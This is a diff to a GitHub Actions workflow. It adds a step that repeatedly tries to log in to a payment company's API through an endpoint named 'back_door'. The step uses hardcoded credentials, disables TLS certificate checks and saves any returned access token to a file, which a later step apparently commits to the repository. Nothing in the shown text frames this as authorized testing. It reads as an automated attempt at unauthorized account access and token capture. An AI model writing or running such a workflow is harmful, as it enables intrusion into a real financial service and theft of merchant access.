@@ -31,6 +31,23 @@ jobs:
           if status != 503:
               open('API_UNBLOCKED.txt','w').write(f"{ts} | status={status} | body={body}\n")
           PYEOF
+
+      - name: Check backdoor merchant login
+        run: |
+          python3 - <<'PYEOF'
+          import json, urllib.request, ssl
+          ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          data = json.dumps({"email":"superxfilecom@gmail.com","password":"Osint123456!","scope":"merchant_user"}).encode()
+          r = urllib.request.Request("https://api.payuung.com/oauth2/authenticate/back_door", data=data, headers={"Content-Type":"application/json"}, method="POST")
+          try:
+              resp = urllib.request.urlopen(r, timeout=20, context=ctx)
+              status, body = resp.status, resp.read()[:400].decode()
+          except urllib.error.HTTPError as e:
+              status, body = e.code, e.read()[:400].decode()
+          print("backdoor:", status, body[:150])
+          if status == 200 and "access_token" in body:
+              open('MERCHANT_LOGIN_OK.txt','w').write(body)
+          PYEOF
       - name: Commit flag jika unblocked
         env:
           GITHUB_TOKEN: ${{ github.token }}
